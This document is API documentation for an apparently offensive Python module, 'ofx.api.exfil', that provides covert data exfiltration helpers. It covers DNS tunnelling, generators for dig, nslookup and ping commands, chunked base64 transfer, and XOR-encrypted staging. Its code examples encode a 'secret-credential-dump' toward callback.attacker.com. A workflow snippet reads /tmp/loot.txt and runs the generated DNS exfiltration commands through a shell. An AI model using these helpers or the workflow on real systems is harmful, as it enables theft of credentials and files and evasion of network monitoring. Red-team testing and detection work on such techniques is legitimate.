# Exfiltration API

The `ofx.api.exfil` module provides helpers for covert data exfiltration: DNS tunnelling, chunked HTTP transfer, and in-memory compression + encryption pipelines.

---

## Submodules

| Submodule | Purpose |
|-----------|---------|
| `exfil.dns` | Base32-encoded DNS tunnelling |
| `exfil.http` | Chunked HTTP transfer and base64 encoding |
| `exfil.pipeline` | Zlib + XOR in-memory pipeline for staging data |

---

## DNS Tunnelling (`exfil.dns`)

### `dns_encode_payload(data: bytes, domain: str, *, chunk_size=30) -> list[str]`

Encode `data` as a series of DNS label-safe strings and return a list of FQDNs suitable for DNS exfiltration.  Each FQDN is `<base32_chunk>.<domain>`.

### `dns_decode_payload(fqdns: list[str], domain: str) -> bytes`

Reverse of `dns_encode_payload`: strip the domain suffix, base32-decode each label, and reassemble the original bytes.

### `dns_exfil_commands(data: bytes, domain: str, *, nameserver=None) -> list[str]`

Return a list of `nslookup`/`dig` shell commands that exfiltrate `data` via DNS queries to `domain`.

```python
from ofx.api.exfil import dns_encode_payload, dns_decode_payload

payload = b"secret-credential-dump"
fqdns = dns_encode_payload(payload, "callback.attacker.com")
recovered = dns_decode_payload(fqdns, "callback.attacker.com")
assert recovered == payload
```

---

## HTTP Chunking (`exfil.http`)

### `http_chunks(data: bytes, *, chunk_size=1024) -> list[bytes]`

Split `data` into fixed-size chunks for piecemeal upload.

### `chunk_b64(data: bytes, *, chunk_size=1024) -> list[str]`

Split `data` into base64-encoded chunks — useful when embedding in JSON/form fields.

### `reassemble_b64(chunks: list[str]) -> bytes`

Reassemble chunks produced by `chunk_b64`.

### `icmp_exfil_command(data: bytes, dest_ip: str, *, chunk_size=32) -> list[str]`

Return a list of `ping` commands that embed hex-encoded data chunks in ICMP payload bytes (`-p` flag).

```python
from ofx.api.exfil import chunk_b64, reassemble_b64

chunks = chunk_b64(b"sensitive data" * 100, chunk_size=256)
print(f"Exfiltrating in {len(chunks)} chunks")
recovered = reassemble_b64(chunks)
```

---

## Pipeline (`exfil.pipeline`)

### `compress_encrypt(data: bytes, key: bytes) -> bytes`

Zlib-compress `data`, XOR-encrypt with `key`, and prepend a 4-byte MD5 checksum header. Suitable for staging before transmission.

### `decompress_decrypt(blob: bytes, key: bytes) -> bytes`

Verify checksum, XOR-decrypt, and zlib-decompress a blob produced by `compress_encrypt`.

```python
from ofx.api.exfil import compress_encrypt, decompress_decrypt
import secrets

key = secrets.token_bytes(16)
blob = compress_encrypt(b"loot data " * 1000, key)
print(f"Compressed+encrypted: {len(blob)} bytes")
recovered = decompress_decrypt(blob, key)
```

---

## Workflow Snippet

```yaml
jobs:
  exfil:
    steps:
      - name: dns exfil
        script: |
          from ofx.api.exfil import dns_exfil_commands
          import subprocess

          data = open("/tmp/loot.txt", "rb").read()
          for cmd in dns_exfil_commands(data, "{{ inputs.callback_domain }}"):
              subprocess.run(cmd, shell=True)
```

---

## See Also

- [OOB Testing](reconnaissance/oob.md) — Capture DNS/HTTP callbacks
- [Loot API](loot.md) — Discover artefacts to exfiltrate
- [Bundle API](bundle.md) — Deliver scripts with embedded modules
